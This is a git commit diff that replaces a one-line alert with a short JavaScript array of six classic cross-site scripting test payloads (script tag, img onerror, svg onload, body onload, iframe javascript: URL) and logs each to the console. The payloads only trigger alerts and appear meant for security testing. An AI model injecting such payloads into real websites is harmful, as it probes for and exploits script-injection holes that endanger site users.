a963b5c7d30d1f479f3726963e6ff913d8a1fe9a
Saher Delgado <saherdelgado@gmail.com>
2024-08-07 15:24:53 -0300

    Update xss_payload_js.js
    new version of the file

--- xss_payload_js.js
+++ xss_payload_js.js
@@ -1,1 +1,13 @@
-alert('XSS');
+// Archivo: xss_payloads.js
+const xssPayloads = [
+  "<script>alert('XSS1')</script>",
+  "<img src='x' onerror='alert(\"XSS2\")'>",
+  "<svg onload='alert(\"XSS3\")'>",
+  "<body onload='alert(\"XSS4\")'>",
+  "alert('XSS')",
+  "<iframe src='javascript:alert(\"XSS5\")'></iframe>"
+];
+
+xssPayloads.forEach(payload => {
+  console.log('XSS Payload:', payload);
+});
